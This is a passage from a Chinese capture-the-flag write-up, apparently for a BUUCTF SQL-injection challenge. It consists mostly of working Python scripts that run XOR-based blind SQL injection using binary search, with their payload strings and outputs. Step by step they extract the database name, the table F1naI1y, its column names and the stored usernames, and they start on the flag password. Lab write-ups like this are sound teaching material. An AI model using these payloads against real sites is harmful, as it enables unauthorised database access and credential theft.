class="hljs-comment"># 登录dvwa的header:</span><br>headers = &#123;<span class="hljs-string">&#x27;Cookie&#x27;</span>:<span class="hljs-string">&#x27;security=low; PHPSESSID=942m2p5g9t4uicc61v7o3gedd7&#x27;</span>,<br>           <span class="hljs-string">&#x27;Referer&#x27;</span>:<span class="hljs-string">&#x27;http://localhost/DVWA/vulnerabilities/sqli_blind/&#x27;</span><br>           &#125;<br><br><span class="hljs-comment"># 当前注入点的url传输格式:</span><br><span class="hljs-comment"># ?id=1&#x27;+and+length(database())%3D4+%23&amp;Submit=Submit#</span><br><br>url = <span class="hljs-string">&#x27;http://6650aff8-185f-482d-8fa4-8cede14a9697.node4.buuoj.cn:81//search.php?id=&#x27;</span><br>n = <span class="hljs-number">1</span><br><span class="hljs-comment"># 对数据库名字第n个字符进行暴力剖解</span><br><span class="hljs-comment"># payload:1&#x27; and ascii(substr(database(),n,1))&gt;100</span><br>database_name = <span class="hljs-string">&quot;&quot;</span><br>database_lenth = <span class="hljs-number">30</span> <span class="hljs-comment"># 手动规定数据库名字长度</span><br><span class="hljs-keyword">while</span> n &lt;= database_lenth:<br>    <span class="hljs-comment"># 从可打印字符开始</span><br>    begin = <span class="hljs-number">32</span><br>    end = <span class="hljs-number">126</span><br>    tmp = (begin + end) // <span class="hljs-number">2</span><br>    <span class="hljs-comment"># 对第n个字符进行判断</span><br>    <span class="hljs-keyword">while</span> (begin &lt; end):<br>        <span class="hljs-comment"># 根据当前网页url传输格式构造payload</span><br>        <span class="hljs-comment"># payload1:用于普通盲注</span><br>        <span class="hljs-comment"># payload1 = &quot;1&#x27;+and+ascii(substr(database()%2C&#123;&#125;%2C1))&gt;&#123;&#125;+%23&quot;.format(n, tmp)</span><br>        <br>        payload2 = <span class="hljs-string">&quot;1^(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;)&quot;</span>.<span class="hljs-built_in">format</span>(n, tmp)<br>        <span class="hljs-comment"># print(begin,end,tmp)</span><br>        <span class="hljs-comment"># 构造url请求,并存储返回的网页响应结果</span><br>        <span class="hljs-comment"># str = &quot;&amp;Submit=Submit#&quot; # 用于补全网页的url</span><br>        <span class="hljs-comment"># print(url + payload2)</span><br>        r = requests.get(url + payload2, )<br>        <span class="hljs-comment"># 判断该payload所返回的网页是true界面还是false界面</span><br>        true_text = <span class="hljs-string">&quot;ERROR&quot;</span><br>        <span class="hljs-comment"># print(r.text)</span><br>        <span class="hljs-keyword">if</span> (true_text <span class="hljs-keyword">in</span> r.text):<br>            <span class="hljs-comment"># 返回true界面 </span><br>            begin = tmp + <span class="hljs-number">1</span><br>            tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># 返回flase界面</span><br>            end = tmp<br>            tmp = (begin + end) // <span class="hljs-number">2</span><br>    <span class="hljs-comment"># 最终begin==end,而此时的tmp就是该字符的ascii码</span><br>    <span class="hljs-built_in">print</span>(tmp)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;该数据库的第%d个字符:%c&quot;</span> % (n, <span class="hljs-built_in">chr</span>(tmp)))<br>    database_name = database_name + <span class="hljs-built_in">chr</span>(tmp)<br>    <span class="hljs-comment"># 对下一个字符进行判断</span><br>    n = n + <span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;该数据库的名字为：&quot;</span>+database_name)<br></code></pre></td></tr></table></figure><p>输出:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">该数据库的名字为：geek<br></code></pre></td></tr></table></figure><p>第三步：直接爆表名，手动规定所有表名总长50:</p><p><strong>由于limit被过滤，所以直接用GROUP_CONCAT()获取所有表名</strong></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=1^(ascii(substr((select(GROUP_CONCAT(TABLE_NAME))from(information_schema.tables)where(TABLE_SCHEMA=database())),&#123;&#125;,1))&gt;&#123;&#125;)<br></code></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># url是随时更新的，具体的以做题时候的为准</span><br><br><span class="hljs-comment"># 登录dvwa的header:</span><br><span class="hljs-comment"># headers = &#123;&#x27;Cookie&#x27;:&#x27;security=low; PHPSESSID=942m2p5g9t4uicc61v7o3gedd7&#x27;,</span><br><span class="hljs-comment">#            &#x27;Referer&#x27;:&#x27;http://localhost/DVWA/vulnerabilities/sqli_blind/&#x27;</span><br><span class="hljs-comment">#            &#125;</span><br><br><span class="hljs-comment"># 当前注入点的url传输格式:</span><br><span class="hljs-comment"># ?id=1&#x27;+and+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema%3Ddatabase()+limit+0%2C1)%2C1%2C1))&gt;102+%23&amp;Submit=Submit#</span><br><br>url = <span class="hljs-string">&#x27;http://6650aff8-185f-482d-8fa4-8cede14a9697.node4.buuoj.cn:81/search.php?id=&#x27;</span><br><span class="hljs-comment"># table_len存储每张表的长度</span><br>table_len = [<span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>]<br><span class="hljs-comment"># table_name存储每张表的名字</span><br>table_name = []<br><span class="hljs-comment"># index存储现在处理的是第index+1张表</span><br>index = <span class="hljs-number">0</span><br><span class="hljs-comment"># 由于获取的是所有表名总字符串，所以只要遍历一次即可</span><br><span class="hljs-keyword">while</span> (index &lt; <span class="hljs-number">1</span>):<br>    name = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-comment"># n表示当前处理的表所处理的是第n个字符</span><br>    n = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> (n &lt;= table_len[index]):<br>        <span class="hljs-comment"># 从可打印字符开始</span><br>        begin = <span class="hljs-number">32</span><br>        end = <span class="hljs-number">126</span><br>        tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># 对第n个字符进行判断</span><br>        <span class="hljs-keyword">while</span> (begin &lt; end):<br>            <span class="hljs-comment"># 根据当前网页url传输格式构造payload</span><br>            <span class="hljs-comment"># payload1:用于普通盲注</span><br>            <span class="hljs-comment"># payload1 = &quot;1&#x27;+and+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema%3Ddatabase()+limit+&#123;&#125;%2C1)%2C&#123;&#125;%2C1))&gt;&#123;&#125;+%23&quot;.format(index, n, tmp)</span><br>            payload2 = <span class="hljs-string">&quot;1^(ascii(substr((select(GROUP_CONCAT(TABLE_NAME))from(information_schema.tables)where(TABLE_SCHEMA=database())),&#123;&#125;,1))&gt;&#123;&#125;)&quot;</span>.<span class="hljs-built_in">format</span>(n, tmp)<br>            <span class="hljs-comment"># 构造url请求,并存储返回的网页响应结果</span><br>            <span class="hljs-comment"># str = &quot;&amp;Submit=Submit#&quot; # 用于补全网页的url</span><br>            <span class="hljs-comment"># print(url + payload1 + str)</span><br>            r = requests.get(url + payload2)<br>            <span class="hljs-comment"># 判断该payload所返回的网页是true界面还是false界面</span><br>            true_text = <span class="hljs-string">&quot;ERROR&quot;</span><br>            <span class="hljs-comment"># print(r.text)</span><br>            <span class="hljs-keyword">if</span> (true_text <span class="hljs-keyword">in</span> r.text):<br>                <span class="hljs-comment"># 返回true界面 </span><br>                begin = tmp + <span class="hljs-number">1</span><br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-comment"># 返回flase界面</span><br>                end = tmp<br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># 最终begin==end,而此时的tmp就是该字符的ascii码</span><br>        name = name + <span class="hljs-built_in">chr</span>(tmp)<br>        <span class="hljs-comment"># 继续下一个字符</span><br>        n = n + <span class="hljs-number">1</span><br>    <span class="hljs-comment"># 存储该表的表名</span><br>    table_name.append(name)<br>    <span class="hljs-comment"># 打印该表的表名</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;第&#123;&#125;张表的名字为&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(index+<span class="hljs-number">1</span>, name))<br>    <span class="hljs-comment"># 继续下一个表</span><br>    index = index + <span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(table_name)<br></code></pre></td></tr></table></figure><p>输出:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">第1张表的名字为F1naI1y,<br>[&#x27;F1naI1y,                      &#x27;]<br></code></pre></td></tr></table></figure><p>所以得到只有表:F1naI1y</p><p>第四步：直接爆表的字段名,手动规定字段名总长50，使用GROUP_CONCAT()将该张表的所有字段名组合在一起</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=1^(ascii(substr((select(GROUP_CONCAT(COLUMN_NAME))from(information_schema.COLUMNS)where(TABLE_NAME=&#x27;F1naI1y&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)<br></code></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># url是随时更新的，具体的以做题时候的为准</span><br><br><span class="hljs-comment"># 登录dvwa的header:</span><br><span class="hljs-comment"># headers = &#123;&#x27;Cookie&#x27;:&#x27;security=low; PHPSESSID=942m2p5g9t4uicc61v7o3gedd7&#x27;,</span><br><span class="hljs-comment">#            &#x27;Referer&#x27;:&#x27;http://localhost/DVWA/vulnerabilities/sqli_blind/&#x27;</span><br><span class="hljs-comment">#            &#125;</span><br><br><span class="hljs-comment"># 当前注入点的url传输格式:</span><br><span class="hljs-comment"># ?id=1&#x27;+and+ascii(substr((select+column_name+from+information_schema.columns+where+table_name%3D+&#x27;users&#x27;+limit+0%2C1)%2C1%2C1))%3D117+%23</span><br><br>url = <span class="hljs-string">&#x27;http://6650aff8-185f-482d-8fa4-8cede14a9697.node4.buuoj.cn:81/search.php?id=&#x27;</span><br><br><span class="hljs-comment"># table_col_num存储每张表每个字段所对应的长度</span><br>table_col_num = &#123;<span class="hljs-string">&#x27;F1naI1y第1字段的长度&#x27;</span>: <span class="hljs-number">50</span>&#125;<br><span class="hljs-comment"># table_name存储每张表的名字</span><br>table_name = [<span class="hljs-string">&#x27;F1naI1y&#x27;</span>]<br><span class="hljs-comment"># col_count存储每张表的字段数</span><br><span class="hljs-comment"># 将所有字段合在一起输出就是只有一个字段</span><br>col_count = &#123;<span class="hljs-string">&#x27;F1naI1y&#x27;</span>: <span class="hljs-number">1</span>&#125;<br><span class="hljs-comment"># table_col_name存储每张表的字段的名字</span><br>table_col_name = &#123;&#125;<br><br>table_num = <span class="hljs-built_in">len</span>(table_name)<br>table_index = <span class="hljs-number">0</span><br><span class="hljs-comment"># 先对表进行遍历,只有表F1naI1y</span><br><span class="hljs-keyword">while</span> (table_index &lt; <span class="hljs-number">1</span>):<br>    <span class="hljs-comment"># 当前表的名字:table_name[table_index]</span><br>    <span class="hljs-comment"># col_num存储当前表的字段数</span><br>    col_num = col_count[table_name[table_index]]<br>    col_index = <span class="hljs-number">0</span><br>    <span class="hljs-comment"># 对当前表的字段进行遍历，获取全部字段名，所以只有一个字段</span><br>    <span class="hljs-keyword">while</span> (col_index &lt; <span class="hljs-number">1</span>):<br>        <span class="hljs-comment"># table_col_key存储当前表当前字段的key</span><br>        key = <span class="hljs-string">&quot;&#123;&#125;第&#123;&#125;字段的长度&quot;</span>.<span class="hljs-built_in">format</span>(table_name[table_index], col_index+<span class="hljs-number">1</span>)<br>        <span class="hljs-comment"># col_len存储当前字段的长度</span><br>        col_len = table_col_num[key]<br>        <span class="hljs-comment"># 遍历当前字段</span><br>        col_len_index = <span class="hljs-number">0</span><br>        <span class="hljs-comment"># name存储当前字段的名称</span><br>        name = <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-keyword">while</span> (col_len_index &lt; col_len):<br>            <span class="hljs-comment"># 用二分法对当前字段进行猜解</span><br>            <span class="hljs-comment"># 从可打印字符开始</span><br>            begin = <span class="hljs-number">32</span><br>            end = <span class="hljs-number">126</span><br>            tmp = (begin + end) // <span class="hljs-number">2</span><br>            <span class="hljs-comment"># 对第n个字符进行判断</span><br>            <span class="hljs-keyword">while</span> (begin &lt; end):<br>                <span class="hljs-comment"># 根据当前网页url传输格式构造payload</span><br>                <span class="hljs-comment"># payload1:用于普通盲注</span><br>                <span class="hljs-comment"># payload1 = &quot;1&#x27;+and+ascii(substr((select+column_name+from+information_schema.columns+where+table_name%3D+&#x27;&#123;&#125;&#x27;+limit+&#123;&#125;%2C1)%2C&#123;&#125;%2C1))&gt;&#123;&#125;+%23&quot;.format(table_name[table_index], col_index, col_len_index+1, tmp)</span><br>                payload2 = <span class="hljs-string">&quot;1^(ascii(substr((select(GROUP_CONCAT(COLUMN_NAME))from(information_schema.COLUMNS)where(TABLE_NAME=&#x27;F1naI1y&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;</span>.<span class="hljs-built_in">format</span>(col_len_index+<span class="hljs-number">1</span>, tmp)<br>                <span class="hljs-comment"># print(table_name[table_index], col_index, col_len_index, tmp)</span><br>                <span class="hljs-comment"># 构造url请求,并存储返回的网页响应结果</span><br>                <span class="hljs-comment"># str = &quot;&amp;Submit=Submit#&quot; # 用于补全网页的url</span><br>                <span class="hljs-comment"># print(url + payload1 + str)</span><br>                r = requests.get(url + payload2)<br>                time.sleep(<span class="hljs-number">0.1</span>)<br>                <span class="hljs-comment"># 判断该payload所返回的网页是true界面还是false界面</span><br>                true_text = <span class="hljs-string">&quot;ERROR&quot;</span><br>                <span class="hljs-comment"># print(r.text)</span><br>                <span class="hljs-keyword">if</span> (true_text <span class="hljs-keyword">in</span> r.text):<br>                    <span class="hljs-comment"># 返回true界面 </span><br>                    <span class="hljs-comment"># print(&quot;true&quot;)</span><br>                    begin = tmp + <span class="hljs-number">1</span><br>                    tmp = (begin + end) // <span class="hljs-number">2</span><br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-comment"># 返回flase界面</span><br>                    end = tmp<br>                    tmp = (begin + end) // <span class="hljs-number">2</span><br>            <span class="hljs-comment"># 最终begin==end,而此时的tmp就是该字符的ascii码</span><br>            <span class="hljs-comment"># print(tmp)</span><br>            name = name + <span class="hljs-built_in">chr</span>(tmp)<br>            <span class="hljs-comment"># 继续下一个字符</span><br>            col_len_index = col_len_index + <span class="hljs-number">1</span><br>        <span class="hljs-comment"># 存储当前字段的名称:</span><br>        key_name = <span class="hljs-string">&quot;&#123;&#125;的第&#123;&#125;个字段的名字&quot;</span>.<span class="hljs-built_in">format</span>(table_name[table_index], col_index+<span class="hljs-number">1</span>)<br>        table_col_name[key_name] = name<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125;:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(key_name, name))<br>        <span class="hljs-comment"># 继续下一个字段</span><br>        col_index = col_index + <span class="hljs-number">1</span><br>    <span class="hljs-comment"># 继续下一张表</span><br>    table_index = table_index + <span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(table_col_name)<br></code></pre></td></tr></table></figure><p>输出:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">F1naI1y的第1个字段的名字:id,username,password<br>&#123;&#x27;F1naI1y的第1个字段的名字&#x27;: &#x27;id,username,password                              &#x27;&#125;<br></code></pre></td></tr></table></figure><p>第五步：爆字段的数据:</p><p>爆username的数据:</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=1^(ascii(substr((select(GROUP_CONCAT(&#123;&#125;))from(&#123;&#125;)),&#123;&#125;,1))&gt;&#123;&#125;)<br></code></pre></td></tr></table></figure><p>测试:</p><p><img src="/images/2023-8-28-FinalSQL/image-20230828134250862-1693214990370-12.png" alt="image-20230828134250862"></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># url是随时更新的，具体的以做题时候的为准</span><br><br><span class="hljs-comment"># 登录dvwa的header:</span><br><span class="hljs-comment"># headers = &#123;&#x27;Cookie&#x27;:&#x27;security=low; PHPSESSID=942m2p5g9t4uicc61v7o3gedd7&#x27;,</span><br><span class="hljs-comment">#            &#x27;Referer&#x27;:&#x27;http://localhost/DVWA/vulnerabilities/sqli_blind/&#x27;</span><br><span class="hljs-comment">#            &#125;</span><br><br><span class="hljs-comment"># 当前注入点的url传输格式:</span><br><span class="hljs-comment"># ?id=1&#x27;+and+ascii(substr((select+user+from+dvwa.users+limit+0%2C1)%2C1%2C1))%3D110+%23</span><br><br>url = <span class="hljs-string">&#x27;http://6650aff8-185f-482d-8fa4-8cede14a9697.node4.buuoj.cn:81/search.php?id=&#x27;</span><br><br><span class="hljs-comment"># database_name存储数据库名字</span><br>database_name = <span class="hljs-string">&quot;geek&quot;</span><br><span class="hljs-comment"># table_name存储指定表的名字</span><br>table_name = <span class="hljs-string">&quot;F1naI1y&quot;</span><br><span class="hljs-comment"># col_name存储指定字段的名字</span><br>col_name = <span class="hljs-string">&quot;username&quot;</span><br><span class="hljs-comment"># col_data_num存储有多少列</span><br><span class="hljs-comment"># 手动指定要查看多少列数据，由于合在一起显示所以只有一列</span><br>col_data_num = <span class="hljs-number">1</span><br><span class="hljs-comment"># col_data_charnum存储每个字段数据的字符个数</span><br><span class="hljs-comment"># 手动指定要查看多少字符数据</span><br>col_data_charnum = <span class="hljs-number">100</span><br><br>rank_index = <span class="hljs-number">0</span><br><span class="hljs-comment"># 先遍历该字段有多少列</span><br><span class="hljs-keyword">while</span> (rank_index &lt; col_data_num):<br>    rank_data_index = <span class="hljs-number">0</span><br>    <span class="hljs-comment"># data用来字段该列的数据</span><br>    data = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">while</span> (rank_data_index &lt; col_data_charnum):<br>        <span class="hljs-comment"># 用二分法对当前字段进行猜解</span><br>        <span class="hljs-comment"># 从可打印字符开始</span><br>        begin = <span class="hljs-number">32</span><br>        end = <span class="hljs-number">126</span><br>        tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># 对第n个字符进行判断</span><br>        <span class="hljs-keyword">while</span> (begin &lt; end):<br>            <span class="hljs-comment"># 根据当前网页url传输格式构造payload</span><br>            <span class="hljs-comment"># payload1:用于普通盲注</span><br>            <span class="hljs-comment"># payload1 = &quot;1&#x27;+and+ascii(substr((select+&#123;&#125;+from+&#123;&#125;.&#123;&#125;+limit+&#123;&#125;%2C1)%2C&#123;&#125;%2C1))&gt;&#123;&#125;+%23&quot;.format(col_name, database_name, table_name, rank_index, rank_data_index+1, tmp)</span><br>            payload2 = <span class="hljs-string">&quot;1^(ascii(substr((select(GROUP_CONCAT(&#123;&#125;))from(&#123;&#125;)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;</span>.<span class="hljs-built_in">format</span>(col_name, table_name, rank_data_index+<span class="hljs-number">1</span>, tmp)<br>            <span class="hljs-comment"># print(table_name[table_index], col_index, col_len_index, tmp)</span><br>            <span class="hljs-comment"># 构造url请求,并存储返回的网页响应结果</span><br>            <span class="hljs-comment"># str = &quot;&amp;Submit=Submit#&quot; # 用于补全网页的url</span><br>            <span class="hljs-comment"># print(url + payload1 + str)</span><br>            r = requests.get(url + payload2)<br>            time.sleep(<span class="hljs-number">0.1</span>)<br>            <span class="hljs-comment"># 判断该payload所返回的网页是true界面还是false界面</span><br>            true_text = <span class="hljs-string">&quot;ERROR&quot;</span><br>            <span class="hljs-comment"># print(r.text)</span><br>            <span class="hljs-keyword">if</span> (true_text <span class="hljs-keyword">in</span> r.text):<br>                <span class="hljs-comment"># 返回true界面 </span><br>                <span class="hljs-comment"># print(&quot;true&quot;)</span><br>                begin = tmp + <span class="hljs-number">1</span><br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-comment"># 返回flase界面</span><br>                end = tmp<br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># 最终begin==end,而此时的tmp就是该字符的ascii码</span><br>        <span class="hljs-comment"># print(tmp)</span><br>        data = data + <span class="hljs-built_in">chr</span>(tmp)<br>        <span class="hljs-comment"># 继续下一个字符</span><br>        rank_data_index = rank_data_index + <span class="hljs-number">1</span><br>    <span class="hljs-comment"># 继续下一列</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125;字段第&#123;&#125;列的值:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(col_name, rank_index + <span class="hljs-number">1</span>, data))<br>    rank_index = rank_index + <span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure><p>输出:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">username字段第1列的值:mygod,welcome,site,site,site,site,Syc,finally,flag<br></code></pre></td></tr></table></figure><p>发现有一个flag,猜测flag在username&#x3D;flag所对应的字段password中</p><p>爆password字段的值，指定username&#x3D;flag</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=1^(ascii(substr((select(password)from(&#123;&#125;)where(username=&#x27;flag&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)<br></code></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># url是随时更新的，具体的以做题时候的为准</span><br><br><span class="hljs-comment"># 登录dvwa的header:</span><br><span class="hljs-comment"># headers = &#123;&#x27;Cookie&#x27;:&#x27;security=low; PHPSESSID=942m2p5g9t4uicc61v7o3gedd7&#x27;,</span><br><span class="hljs-comment">#            &#x27;Referer&#x27;:&#x27;http://localhost/DVWA/vulnerabilities/sqli_blind/&#x27;</span><br><span class="hljs-comment">#            &#125;</span><br><br><span class="hljs-comment"># 当前注入点的url传输格式:</span><br><span class="hljs-comment"># ?id=1&#x27;+and+ascii(substr((select+user+from+dvwa.users+limit+0%2C1)%2C1%2C1))%3D110+%23</span><br><br>url = <span class="hljs-string">&#x27;http://6650aff8-185f-482d-8fa4-8cede14a9697.node4.buuoj.cn:81/search.php?id=&#x27;</span><br><br><span class="hljs-comment"># database_name存储数据库名字</span><br>database_name = <span class="hljs-string">&quot;geek&quot;</span><br><span class="hljs-comment"># 